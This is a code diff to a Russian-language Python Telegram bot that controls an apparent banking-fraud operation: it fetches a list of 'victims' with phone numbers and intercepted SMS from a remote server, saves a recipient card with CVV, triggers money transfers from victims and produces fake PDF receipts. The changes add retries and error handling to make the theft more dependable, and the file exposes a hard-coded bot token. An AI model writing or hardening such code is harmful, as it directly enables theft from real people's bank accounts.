@@ -4,11 +4,25 @@ import datetime
 import random
 import os
 from fpdf import FPDF
+import time
 
 TOKEN = '8985419744:AAHjFeI7ARpPYj2sWUxzB85fXCo_ksNRF_0'
 SERVER = 'https://mybank-xwhm.onrender.com'
 
 bot = telebot.TeleBot(TOKEN)
+
+def safe_get_json(url, retries=3, delay=5):
+    for i in range(retries):
+        try:
+            r = requests.get(url, timeout=30)
+            if r.status_code == 200:
+                return r.json()
+            else:
+                print(f"Попытка {i+1}: статус {r.status_code}")
+        except Exception as e:
+            print(f"Ошибка: {e}, попытка {i+1}")
+        time.sleep(delay)
+    return None
 
 def generate_receipt(amount, card_to, phone='', transaction_id=None):
     if transaction_id is None:
@@ -36,15 +50,15 @@ def generate_receipt(amount, card_to, phone='', transaction_id=None):
 
 @bot.message_handler(commands=['list'])
 def list_cmd(msg):
-    try:
-        r = requests.get(f'{SERVER}/victims').json()
-        if not r:
-            bot.reply_to(msg, 'Нет жертв')
-        else:
-            text = '\n'.join([f"ID {v['id']}: {v['phone']} - {v['sms'][:30]}" for v in r])
-            bot.reply_to(msg, text)
-    except Exception as e:
-        bot.reply_to(msg, f'Ошибка: {e}')
+    data = safe_get_json(f'{SERVER}/victims')
+    if data is None:
+        bot.reply_to(msg, 'Сервер не отвечает или не вернул JSON')
+        return
+    if not data:
+        bot.reply_to(msg, 'Нет жертв')
+    else:
+        text = '\n'.join([f"ID {v['id']}: {v['phone']} - {v['sms'][:30]}" for v in data])
+        bot.reply_to(msg, text)
 
 @bot.message_handler(commands=['set'])
 def set_cmd(msg):
@@ -54,8 +68,11 @@ def set_cmd(msg):
         return
     card, expiry, cvv = parts[1], parts[2], parts[3]
     try:
-        requests.post(f'{SERVER}/set_card', json={'card': card, 'expiry': expiry, 'cvv': cvv})
-        bot.reply_to(msg, 'Карта получателя сохранена')
+        r = requests.post(f'{SERVER}/set_card', json={'card': card, 'expiry': expiry, 'cvv': cvv}, timeout=30)
+        if r.status_code == 200:
+            bot.reply_to(msg, 'Карта получателя сохранена')
+        else:
+            bot.reply_to(msg, f'Ошибка сервера: {r.status_code}')
     except Exception as e:
         bot.reply_to(msg, f'Ошибка: {e}')
 
@@ -67,16 +84,25 @@ def go_cmd(msg):
         return
     v_id, amount = parts[1], parts[2]
     try:
-        victims = requests.get(f'{SERVER}/victims').json()
+        victims = safe_get_json(f'{SERVER}/victims')
+        if victims is None:
+            bot.reply_to(msg, 'Не удалось получить список жертв')
+            return
         victim_phone = ''
         for v in victims:
             if str(v['id']) == v_id:
                 victim_phone = v['phone']
                 break
-        r = requests.post(f'{SERVER}/transfer', json={'victim_id': v_id, 'amount': amount})
+        r = requests.post(f'{SERVER}/transfer', json={'victim_id': v_id, 'amount': amount}, timeout=30)
+        if r.status_code != 200:
+            bot.reply_to(msg, f'Ошибка сервера: {r.status_code}')
+            return
         result = r.json()
         if result.get('status') == 'ok':
-            card_info = requests.get(f'{SERVER}/get_card').json()
+            card_info = safe_get_json(f'{SERVER}/get_card')
+            if card_info is None:
+                bot.reply_to(msg, 'Не удалось получить карту')
+                return
             card_to = card_info.get('card', 'не задана')
             pdf_file = generate_receipt(amount, card_to, victim_phone)
             with open(pdf_file, 'rb') as f:
